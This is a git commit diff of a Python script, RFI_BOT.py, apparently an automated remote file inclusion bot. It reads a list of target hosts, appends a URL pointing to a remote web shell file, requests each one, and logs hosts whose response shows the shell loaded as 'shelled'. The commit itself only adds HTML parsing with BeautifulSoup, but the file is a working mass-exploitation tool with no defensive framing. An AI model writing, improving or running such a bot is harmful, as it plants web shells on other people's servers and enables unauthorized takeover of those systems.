b1b932ca0a8289f9aa3e65d585f93b58b7f28dd3
Twist3D666 <57061785+Twist3D666@users.noreply.github.com>
2020-02-09 11:06:59 +0100

    Update RFI_BOT.py

--- RFI_BOT.py
+++ RFI_BOT.py
@@ -2,6 +2,7 @@
 """
 SecBLiZZ' RFI-Bot by tw!XX
 """
+from bs4 import BeautifulSoup
 import requests
 
 hostlist = open('result.txt','r').read().splitlines()
@@ -10,10 +11,11 @@ shell = "http://www.url-to-retrieve-shell.from/files/shell.txt"
 def autoshell(url):    
         try:
             request = requests.get(url+shell)
+            soup = BeautifulSoup(request.text,"html.parser")
         except:
             pass
         else:
-            if request.findAll('Sh3ll'):
+            if soup.findAll('Sh3ll'):
                 print(url+" has been shelled!")
                 logfile = open('shelled.txt','a')
                 logfile.write(url+shell+"\n")
@@ -21,3 +23,4 @@ def autoshell(url):
 
 for host in hostlist:
     autoshell(host)
+
